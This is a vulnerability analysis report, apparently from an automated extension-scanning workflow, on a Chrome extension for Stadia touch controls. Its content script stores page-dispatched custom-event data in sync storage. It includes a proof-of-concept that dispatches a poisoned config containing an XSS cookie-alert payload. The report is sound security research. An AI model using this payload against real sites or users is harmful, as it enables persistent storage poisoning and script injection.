# CoCo Analysis: kdkboloommjpbahkdlhengbghlhcejaj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_newButtonConfig → chrome_storage_sync_set_sink

**CoCo Trace:**
- Source: `cs_window_eventListener_newButtonConfig` (Line 997, cs_0.js)
- Sink: `chrome_storage_sync_set_sink` (Line 999, cs_0.js)
- Flow: `e.detail` → `chrome.storage.sync.set({"buttonConfig": buttons})`

**Code:**

```javascript
// Content script - cs_0.js Lines 997-1002
window.addEventListener("newButtonConfig", function(e) {
  const buttons = e.detail; // ← attacker-controlled via custom event
  chrome.storage.sync.set({"buttonConfig": buttons}, function(){
    console.log("TouchStadia: Set layout!");
  });
}, false);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom event dispatch from malicious webpage

**Attack:**

```javascript
// From a malicious webpage on https://stadia.google.com/* or https://html5gamepad.com/*
// (where the content script is injected per manifest.json)

// Exploit: Inject malicious button configuration
const maliciousConfig = {
  // Attacker-crafted button layout that could:
  // - Disrupt gameplay by mapping buttons incorrectly
  // - Create UI overlays that phish for credentials
  // - Inject malicious JavaScript if the config is later eval'd or used in innerHTML
  attack: '<img src=x onerror=alert(document.cookie)>',
  buttons: [{
    type: 'malicious',
    position: 'center',
    action: 'execute-payload'
  }]
};

// Dispatch the custom event to trigger storage poisoning
window.dispatchEvent(new CustomEvent("newButtonConfig", {
  detail: maliciousConfig
}));

// The extension will store this attacker-controlled configuration
// which persists in chrome.storage.sync across browser sessions
```

**Impact:** Storage poisoning vulnerability allowing malicious webpages on Stadia or html5gamepad.com to inject arbitrary button configurations into the extension's sync storage. While the immediate impact is limited to disrupting the extension's functionality, the stored malicious configuration persists across sessions and could be exploited if the extension later processes this data unsafely (e.g., using it in eval(), innerHTML, or DOM manipulation without sanitization). This enables persistent disruption of the extension's touch controls for Stadia gameplay.

Note: The extension's content_scripts only match `https://stadia.google.com/*` and `https://html5gamepad.com/*`, so the attack surface is limited to these domains. However, an attacker who can inject code on these domains (via XSS or compromised third-party scripts) can exploit this vulnerability.
